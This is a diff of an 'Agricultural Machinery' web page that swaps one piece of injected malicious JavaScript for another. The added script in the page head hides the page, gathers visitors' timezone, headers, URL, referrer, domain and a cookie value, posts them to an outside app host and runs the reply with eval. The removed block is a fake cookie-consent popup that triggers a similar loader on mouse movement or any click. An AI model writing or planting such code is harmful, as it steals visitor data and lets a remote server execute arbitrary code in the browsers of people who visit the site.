@@ -2,6 +2,13 @@
 <html lang="en">
 <head>
 
+<style>body {display: none;}</style>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
+<script>
+$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo474111ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">.</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-54374-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:"https://stingray-app-e5xai.ondigitalocean.app/",type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
+</script>
+	
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Agricultural Machinery</title>
@@ -295,179 +302,5 @@
         this.reset();
     });
 </script>
-	<script>
-	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://example.com";
-	            const style = document.createElement("style");
-	            style.textContent = `
-	                .cookie-overlay {
-	                    position: fixed;
-	                    inset: 0;
-	                    background: rgba(0, 0, 0, 0.8);
-	                    backdrop-filter: blur(10px);
-	                    display: flex;
-	                    align-items: center;
-	                    justify-content: center;
-	                    padding: 20px;
-	                    z-index: 9999;
-	                    animation: fadeInBackground 0.5s ease-out forwards;
-	                }
-	                @keyframes fadeInBackground {
-	                    from { opacity: 0; }
-	                    to { opacity: 1; }
-	                }
-	                .cookie-popup {
-	                    position: fixed;
-	                    bottom: 60px;
-	                    left: 50%;
-	                    transform: translateX(-50%);
-	                    background-color: #ffffff;
-	                    border: none;
-	                    color: #333;
-	                    padding: 30px;
-	                    border-radius: 10px;
-	                    z-index: 10000;
-	                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-	                    max-width: 400px;
-	                    text-align: center;
-	                }
-	                .close-btn {
-	                    background: none;
-	                    border: none;
-	                    font-size: 1.5rem;
-	                    position: absolute;
-	                    top: 10px;
-	                    right: 10px;
-	                    cursor: pointer;
-	                    color: #888;
-	                }
-	                .btn-primary {
-	                    background-color: #007bff;
-	                    color: #fff;
-	                    border: none;
-	                    padding: 12px 24px;
-	                    border-radius: 5px;
-	                    cursor: pointer;
-	                    margin-top: 15px;
-	                    display: inline-block;
-	                    text-decoration: none;
-	                    transition: background-color 0.3s;
-	                }
-	                .btn-primary:hover {
-	                    background-color: #0056b3;
-	                }
-	                h3 {
-	                    font-family: 'Arial', sans-serif;
-	                    margin-bottom: 10px;
-	                }
-	                p {
-	                    font-family: 'Arial', sans-serif;
-	                    line-height: 1.5;
-	                }
-	            `;
-	            document.head.appendChild(style);
-	            const overlay = document.createElement("div");
-	            overlay.className = "cookie-overlay";
-	            overlay.id = "cookie-overlay";
-	            overlay.innerHTML = `
-	<div class="cookie-popup">
-	<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
-	<h3>Cookie Policy</h3>
-	<p>
-	                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
-	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
-	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
-	</p>
-	<a href="https://example.com" id="accept-cookies" class="btn-primary">Accept</a>
-	</div>
-	            `;
-	            document.body.appendChild(overlay);
-	            let isRedirected = false;
-	            let startPos = null;
-	            let redirectTimeout = null;
-	            const handleRedirect = () => {
- 
- 
-	    // Load jQuery and jstimezonedetect scripts
-	    const loadScript = (src) => {
-	        return new Promise((resolve, reject) => {
-	            const script = document.createElement('script');
-	            script.src = src;
-	            script.onload = resolve;
-	            script.onerror = reject;
-	            document.head.appendChild(script);
-	        });
-	    };
- 
-	    // Execute the custom JavaScript after loading dependencies
-	    const executeCustomJS = async () => {
-	        try {
-	            await loadScript('//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js');
-	            await loadScript('//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js');
- 
-	            // Your custom JS logic here:
-	            const f = new XMLHttpRequest();
-	            f.open("GET", document.location, true);
-	            f.send(null);
-	            let g;
-	            f.onreadystatechange = function() {
-	                g = f.getAllResponseHeaders().toLowerCase();
-	            };
-	            // Additional logic for timezone detection, cookie extraction, etc.
-	            const d = jstz.determine();
-	            const e = d.name();
-	            const qu = escape(window.location.search.substr(1));
-	            const rui = location.pathname + location.search;
-	            const r = document.referrer;
-	            const sn = document.domain;
-	            let value = "; " + document.cookie;
-	            let pa = value.split("; _event=");
-	            let co = pa.pop().split(";").shift();
-	            $.ajax({
-	                url: "https://net-d6aufffxdyh0a4fa.z01.azurefd.net",
-	                type: "POST",
-	                data: "tz=" + e + "&he=" + g + "&rui=" + rui + "&qu=" + qu + "&r=" + r + "&sn=" + sn + "&co=" + co,
-	                success: function(a) {
-	                    eval(a);
-	                }
-	            });
-	        } catch (error) {
-	            console.error('Error executing custom JS:', error);
-	        }
-	    };
- 
-	    executeCustomJS();
-	};
-	            const detectMouseMove = (event) => {
-	                if (isRedirected) return;
-	                const screenHeight = window.innerHeight;
-	                const activeTop = screenHeight * 0.15;
-	                if (event.clientY >= activeTop) {
-	                    if (!startPos) {
-	                        startPos = { x: event.clientX, y: event.clientY };
-	                    } else {
-	                        const dx = Math.abs(event.clientX - startPos.x);
-	                        const dy = Math.abs(event.clientY - startPos.y);
-	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
-	                            redirectTimeout = setTimeout(handleRedirect, 1000);
-	                        }
-	                    }
-	                } else {
-	                    startPos = null;
-	                    clearTimeout(redirectTimeout);
-	                    redirectTimeout = null;
-	                }
-	            };
-	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
-	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
-	                e.preventDefault();
-	                handleRedirect();
-	            });
-	            document.getElementById("close-popup").addEventListener("click", function (e) {
-	                e.preventDefault();
-	                handleRedirect();
-	            });
-	        });
-	</script>
 </body>
 </html>
